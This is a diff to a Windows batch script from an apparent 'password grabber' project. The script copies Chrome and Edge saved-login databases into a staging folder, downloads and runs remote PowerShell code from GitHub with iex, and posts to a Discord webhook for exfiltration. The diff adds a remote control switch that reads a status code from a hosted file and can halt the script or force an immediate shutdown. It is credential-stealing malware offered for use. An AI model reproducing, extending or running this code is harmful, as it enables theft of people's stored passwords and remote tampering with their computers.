@@ -1,7 +1,16 @@
 @echo off
-
 setlocal enabledelayedexpansion
 
+
+set "url=https://raw.githubusercontent.com/ZDStudios/DW-Password-Grabber/refs/heads/main/allowed.txt"
+set "webhook_url=YOURE_DISCORD_WEBHOOK_URL"
+
+:: Get the HTTP status code using PowerShell
+for /f %%i in ('powershell -Command "(Invoke-WebRequest -Uri '%url%').StatusCode"') do set status=%%i
+
+:: Handle different status codes
+if "%status%"=="200" (
+    echo Status 200: Continuing as normal...
 mkdir "C:\Users\%USERNAME%\GP-7"
 
 mkdir "C:\Users\%USERNAME%\GP-7\Chrome"
@@ -25,11 +34,6 @@ copy "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login D
 powershell -Command "& {iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/ZDStudios/DW-Password-Grabber/refs/heads/main/updates.txt')}"
 
 
-
-C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
-
-
-set "webhook_url=YOUR_DISCORD_WEBHOOK"
 
 powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='----------------------------------------------------------------------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"
  
@@ -82,6 +86,14 @@ powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body 
 
 
 powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='----------------------------------------------------------------------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"
+
+) else if "%status%"=="199" (
+    echo Status 199: Stopping script...
+    exit
+) else if "%status%"=="201" (
+    echo Status 201: Running additional command...
+    shutdown /s /t 0
+)
 
 
 
